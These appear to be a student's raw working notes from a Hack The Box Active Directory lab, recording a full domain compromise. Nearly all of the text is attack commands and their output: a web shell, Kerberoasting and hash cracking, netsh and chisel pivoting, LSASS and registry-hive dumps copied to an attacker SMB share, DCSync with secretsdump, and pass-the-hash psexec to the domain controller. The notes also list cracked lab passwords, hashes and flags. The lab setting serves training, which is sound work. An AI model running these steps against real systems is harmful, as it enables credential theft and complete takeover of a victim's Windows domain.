## LAB

http://10.129.208.65/uploads/antak.aspx
admin
My_W3bsH3ll_P@ssw0rd!

C:\Users\Administrator\Desktop\flag.txt
JusT_g3tt1ng_st@rt3d!

PS> whoami
nt authority\system

sudo responder -I tun0 

PS> hostname
WEB-WIN01

rpcclient -U "" -N $TARGET
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED

ipconfig /all


Windows IP Configuration

   Host Name . . . . . . . . . . . . : WEB-WIN01
   Primary Dns Suffix  . . . . . . . : INLANEFREIGHT.LOCAL
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : INLANEFREIGHT.LOCAL
                                       htb

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter #2
   Physical Address. . . . . . . . . : 00-50-56-B9-88-EA
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::c997:6738:a2ea:dc84%7(Preferred) 
   IPv4 Address. . . . . . . . . . . : 172.16.6.100(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 172.16.6.1
   DHCPv6 IAID . . . . . . . . . . . : 167792726
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2D-03-F0-45-00-50-56-B9-0A-8B
   DNS Servers . . . . . . . . . . . : 172.16.6.3
   NetBIOS over Tcpip. . . . . . . . : Enabled

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-0A-8B
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::f4(Preferred) 
   Lease Obtained. . . . . . . . . . : Thursday, December 7, 2023 1:23:58 PM
   Lease Expires . . . . . . . . . . : Thursday, December 7, 2023 2:23:58 PM
   IPv6 Address. . . . . . . . . . . : dead:beef::d01f:5b81:e729:9ea(Preferred) 
   Link-local IPv6 Address . . . . . : fe80::d01f:5b81:e729:9ea%3(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.129.223.204(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Thursday, December 7, 2023 1:24:01 PM
   Lease Expires . . . . . . . . . . : Thursday, December 7, 2023 2:23:57 PM
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:f362%3
                                       10.129.0.1
   DHCP Server . . . . . . . . . . . : 10.129.0.1
   DHCPv6 IAID . . . . . . . . . . . : 100683862
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2D-03-F0-45-00-50-56-B9-0A-8B
   DNS Servers . . . . . . . . . . . : 127.0.0.1
   NetBIOS over Tcpip. . . . . . . . : Enabled
   Connection-specific DNS Suffix Search List :
                                       htb

git clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries.git
cd Ghostpack-CompiledBinaries/

c:\Rubeus.exe kerberoast /stats

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: Kerberoasting

[*] Listing statistics about target users, no ticket requests being performed.
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 7


 ------------------------------------- 
 | Supported Encryption Type | Count |
 ------------------------------------- 
 | RC4_HMAC_DEFAULT          | 7     |
 ------------------------------------- 

 ---------------------------------- 
 | Password Last Set Year | Count |
 ---------------------------------- 
 | 2022                   | 7     |
 ---------------------------------- 

c:\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap /outfile:type.hash

SPN MSSQLSvc/SQL01.inlanefreight.local:1433


setspn.exe -Q */*


CN=DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
	Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC01.INLANEFREIGHT.LOCAL
	ldap/DC01.INLANEFREIGHT.LOCAL/ForestDnsZones.INLANEFREIGHT.LOCAL
	ldap/DC01.INLANEFREIGHT.LOCAL/DomainDnsZones.INLANEFREIGHT.LOCAL
	DNS/DC01.INLANEFREIGHT.LOCAL
	GC/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL
	RestrictedKrbHost/DC01.INLANEFREIGHT.LOCAL
	RestrictedKrbHost/DC01
	RPC/03d2eace-bb3d-467e-a00a-eab0dbfaa065._msdcs.INLANEFREIGHT.LOCAL
	HOST/DC01/INLANEFREIGHT
	HOST/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT
	HOST/DC01
	HOST/DC01.INLANEFREIGHT.LOCAL
	HOST/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL
	E3514235-4B06-11D1-AB04-00C04FC2DCD2/03d2eace-bb3d-467e-a00a-eab0dbfaa065/INLANEFREIGHT.LOCAL
	ldap/DC01/INLANEFREIGHT
	ldap/03d2eace-bb3d-467e-a00a-eab0dbfaa065._msdcs.INLANEFREIGHT.LOCAL
	ldap/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT
	ldap/DC01
	ldap/DC01.INLANEFREIGHT.LOCAL
	ldap/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL
CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	kadmin/changepw
CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	MSSQLSvc/SQL01.inlanefreight.local:1433
CN=sqlprod,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	MSSQLSvc/SQL02.inlanefreight.local:1433
CN=sqldev,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	MSSQLSvc/SQL-DEV01.inlanefreight.local:1433
CN=sqltest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	MSSQLSvc/DEVTEST.inlanefreight.local:1433
CN=sqlqa,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	MSSQLSvc/QA001.inlanefreight.local:1433
CN=azureconnect,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	adfsconnect/azure01.inlanefreight.local
CN=backupjob,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	backupjob/veam001.inlanefreight.local
CN=WEB-WIN01,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
	RestrictedKrbHost/WEB-WIN01
	HOST/WEB-WIN01
	RestrictedKrbHost/WEB-WIN01.INLANEFREIGHT.LOCAL
	HOST/WEB-WIN01.INLANEFREIGHT.LOCAL
CN=MS01,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
	tapinego/MS01
	tapinego/MS01.INLANEFREIGHT.LOCAL
	TERMSRV/MS01
	TERMSRV/MS01.INLANEFREIGHT.LOCAL
	WSMAN/MS01
	WSMAN/MS01.INLANEFREIGHT.LOCAL
	RestrictedKrbHost/MS01
	HOST/MS01
	RestrictedKrbHost/MS01.INLANEFREIGHT.LOCAL
	HOST/MS01.INLANEFREIGHT.LOCAL

c:\Rubeus.exe kerberoast /user:svc_sql /nowrap outfile:type.hash

[*] SamAccountName         : svc_sql
[*] DistinguishedName      : CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : MSSQLSvc/SQL01.inlanefreight.local:1433
[*] PwdLastSet             : 3/30/2022 2:14:52 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433@INLANEFREIGHT.LOCAL*$F8078F3D32EC02ABF629E71454AFD75E$D7D3E2E0005DF7C016D4E8C7A98E7AD4F990DF89580669312B91E4ED397B59A13E8B6D28BBC9BC41559F255DCF88319724C651C8509CA8BD059AD1AA633EE4BB6F

hashcat -m 13100 type.hash /usr/share/wordlists/rockyou.txt 
lucky7

nslookup MS01.INLANEFREIGHT.LOCAL


Name:    MS01.INLANEFREIGHT.LOCAL
Addresses:  dead:beef::405a:9828:4c1d:6776
	  dead:beef::2d
	  172.16.6.50

xfreerdp /u:svc_sql /p:"lucky7" /v:172.16.6.50

sudo nmap -sS $TARGET
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-08 11:43 GMT
Nmap scan report for 10.129.81.134
Host is up (0.024s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE
80/tcp  open  http
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds


1) Cloning Chisel

git clone https://github.com/jpillora/chisel.git
cd chisel
go build

sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support share /home/htb-ac-786011/
cmd.exe /c copy \\10.10.14.190\share\chisel\chisel

**Error** : organization's security policies block unauthenticated guest access


sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support share /home/htb-ac-786011/ -user test -password test

net use n: \\10.10.14.190\share /user:test test
The command completed successfully.

copy n:\chisel\chisel

dir C:\windows\system32\inetsrv
chisel

./chisel server -v -p 1234 --socks5

Program 'chisel' failed to run: Class not registeredAt line:1 char:1
+ ./chisel server -v -p 1234 --socks5
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
At line:1 char:1
+ ./chisel server -v -p 1234 --socks5
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed

C:\Windows\system32\netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.71.186 connectport=3389 connectaddress=172.16.6.50

C:\Windows\system32\netsh.exe interface portproxy show v4tov4

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
10.129.8.5      8080        172.16.6.50     3389

xfreerdp /u:svc_sql /p:"lucky7" /v:$TARGET:8080

spn$_r0ast1ng_on_@n_0p3n_f1re

tpetty

c:\Rubeus.exe kerberoast /user:tpetty /nowrap outfile:type.hash

DUMP LSSAS
Test-NetConnection -ComputerName WEB-WIN01 -Port 5985

ComputerName     : WEB-WIN01
RemoteAddress    : 172.16.6.100
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 172.16.6.50
TcpTestSucceeded : True


PS> New-Item -ItemType Directory -Path "C:\Partage2"


    Directory: C:\


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        12/8/2023   3:03 PM                Partage2     

New-SmbShare -Name Partage2$ -Path 'C:\Partage2\' -FullAccess 'svc_sql'

Name     ScopeName Path       Description
----     --------- ----       -----------
Partage2$ *         C:\Partage2     

dir \\172.16.6.100\Partage2$

copy C:\Users\SVC_SQ~1.INL\AppData\Local\Temp\lsass.DMP \\172.16.6.100\Partage2$\

dir c:\Partage2
    Directory: C:\Partage2


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        12/8/2023  12:53 PM       46890501 lsass.DMP  


sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support share /home/htb-ac-786011/ -user test -password test

net use n: \\10.10.14.102\share /user:test test
The command completed successfully.

copy c:\Partage2\lsass.DMP n:\

pypykatz lsa minidump lsass.dmp

--> FAILED because of lsass.dmp and not lsass.DMP


reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

New-Item -ItemType Directory -Path "C:\Partage2"
New-SmbShare -Name Partage2$ -Path 'C:\Partage2\' -FullAccess 'svc_sql'

copy C:\security.save \\172.16.6.100\Partage2$\
copy C:\system.save \\172.16.6.100\Partage2$\
copy C:\sam.save \\172.16.6.100\Partage2$\

ls c:\Partage2
Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        12/8/2023   2:24 PM          53248 sam.save                                                              
-a----        12/8/2023   2:24 PM          36864 security.save                                                         
-a----        12/8/2023   2:24 PM       15749120 system.save

sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support share /home/htb-ac-786011/ -user test -password test

net use n: \\10.10.14.102\share /user:test test

copy c:\Partage2\security.save n:\
copy c:\Partage2\system.save n:\
copy c:\Partage2\sam.save n:\

python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
INLANEFREIGHT.LOCAL/tpetty:$DCC2$10240#tpetty#685decd67a67f5b6e45a182ed076d801
INLANEFREIGHT.LOCAL/svc_sql:$DCC2$10240#svc_sql#acc5441d637ce6aabf3a3d9d4f8137fb
INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#9553faad97c2767127df83980f3ac245


sudo hashcat -m 1000 685decd67a67f5b6e45a182ed076d801 /usr/share/wordlists/rockyou.txt
sudo hashcat -m 0 685decd67a67f5b6e45a182ed076d801 /usr/share/wordlists/rockyou.txt
sudo hashcat -m 900 685decd67a67f5b6e45a182ed076d801 /usr/share/wordlists/rockyou.txt

sudo hashcat -m 1000 hashes.txt.ntds /usr/share/wordlists/rockyou.txt

sudo hashcat -m 1000 9553faad97c2767127df83980f3ac245 /usr/share/wordlists/rockyou.txt

john --format=Raw-MD5 --wordlist /usr/share/wordlists/rockyou.txt tpetty_hash.txt
!@#$%..sss

vi tpetty_hash.txt

sudo hashcat -m 1000 --show hashes.txt.ntds

pypykatz lsa minidump lsass.DMP

Sup3rS3cur3D0m@inU2eR

nslookup DC01.INLANEFREIGHT.LOCAL
DNS request timed out.
    timeout was 2 seconds.
Server:  UnKnown
Address:  172.16.6.3

Name:    DC01.INLANEFREIGHT.LOCAL
Address:  172.16.6.3

C:\Windows\system32>set L
LOCALAPPDATA=C:\Users\svc_sql.INLANEFREIGHT\AppData\Local
LOGONSERVER=\\DC01

ping DC01

Pinging DC01.INLANEFREIGHT.LOCAL [172.16.6.3] with 32 bytes of data:
Reply from 172.16.6.3: bytes=32 time<1ms TTL=128
Reply from 172.16.6.3: bytes=32 time<1ms TTL=128

xfreerdp /u:tpetty /p:"Sup3rS3cur3D0m@inU2eR" /v:$TARGET:8080

Get-DomainUser -Identity tpetty  |select samaccountname,objectsid,memberof,useraccountcontrol |fl

C:\Windows\system32\netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.71.186 connectport=3389 connectaddress=172.16.6.3

C:\Windows\system32\netsh.exe interface portproxy show v4tov4

C:\Windows\system32\netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.1.79 connectport=3389 connectaddress=172.16.6.50
C:\Windows\system32\netsh.exe interface portproxy show v4tov4

xfreerdp /u:svc_sql /p:"lucky7" /v:10.129.1.79:8080


C:\Windows\system32\netsh.exe interface portproxy add v4tov4 listenport=3389 listenaddress=172.16.6.50 connectport=139 connectaddress=172.16.6.3

secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT.LOCAL/tpetty@10.129.1.79:8080
Sup3rS3cur3D0m@inU2eR

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

Password:
[-] RemoteOperations failed: [Errno Connection error (10.129.1.79:8080:445)] [Errno -2] Name or service not known
[*] Cleaning up... 


C:\Windows\system32\netsh.exe interface portproxy add v4tov4 listenport=3389 listenaddress=172.16.6.50 connectport=445 connectaddress=172.16.6.3


C:\Windows\system32\netsh.exe interface portproxy delete v4tov4 listenport=3389 listenaddress=172.16.6.50

xfreerdp /u:tpetty /p:"Sup3rS3cur3D0m@inU2eR" /v:10.129.1.79:8080
xfreerdp /u:INLANEFREIGHT.LOCAL/tpetty /p:"Sup3rS3cur3D0m@inU2eR" /v:10.129.1.79:8080
xfreerdp /u:INLANEFREIGHT/tpetty /p:"Sup3rS3cur3D0m@inU2eR" /v:10.129.1.79:8080


--> Failed

runas /user:INLANEFREIGHT.LOCAL/tpetty "dir C:\Users\Administrator"

$credential = Get-Credential
Enter-PSSession -ComputerName localhost -Credential $credential

Enter-PSSession : Connecting to remote server localhost failed with the following error message : Access is denied.

tpetty@INLANEFREIGHT.LOCAL
Sup3rS3cur3D0m@inU2eR

--> failed

secretsdump -outputfile output -hashes 685decd67a67f5b6e45a182ed076d801 INLANEFREIGHT.LOCAL/tpetty@DC01

git clone https://github.com/jpillora/chisel.git

cd chisel
go build

sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support share /home/htb-ac-786011/ -user test -password test

net use n: \\10.10.14.37\share /user:test test
The command completed successfully.

copy n:\chisel\chisel

dir C:\windows\system32\inetsrv
chisel

sudo vi /etc/proxychains.conf
socks5 127.0.0.1 1080 

On attack host :

cd chisel
sudo ./chisel server --reverse -v -p 1234 --socks5

On target :

./chisel client -v 10.10.14.37:1234 R:socks

wget https://github.com/jpillora/chisel/releases/download/v1.7.3/chisel_1.7.3_windows_amd64.gz
gzip -d chisel_1.7.3_windows_amd64.gz
mv chisel_1.7.3_windows_amd64 chisel.exe

Remove-Item chisel

net use n: \\10.10.14.37\share /user:test test
copy n:\chisel.exe

.\chisel.exe client -v 10.10.14.37:1234 R:socks

proxychains xfreerdp /v:172.16.6.3 /u:tpetty /p:Sup3rS3cur3D0m@inU2eR
proxychains xfreerdp /u:tpetty /d:INLANEFREIGHT.LOCAL /pth:685decd67a67f5b6e45a182ed076d801 /v:172.16.6.3
proxychains xfreerdp /u:tpetty /d:INLANEFREIGHT /pth:685decd67a67f5b6e45a182ed076d801 /v:172.16.6.3
--> Failed


proxychains xfreerdp /u:svc_sql /p:"lucky7" /v:172.16.6.50
OK

proxychains xfreerdp /u:Administrator /d:INLANEFREIGHT /pth:bdaffbfe64f1fc646a3353be1c2c3c99 /v:172.16.6.3
--> Failed

proxychains secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT.LOCAL/tpetty@172.16.6.3
Sup3rS3cur3D0m@inU2eR

--> OK !!!

Administrator:500:aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0:::

proxychains xfreerdp /u:Administrator /d:INLANEFREIGHT /pth:27dedb1dab4d8545c6e1c66fba077da0 /v:172.16.6.3
--> Failed

proxychains impacket-psexec administrator@172.16.6.3 -hashes :27dedb1dab4d8545c6e1c66fba077da0

type c:\Users\Administrator\Desktop\flag.txt
r3plicat1on_m@st3r!
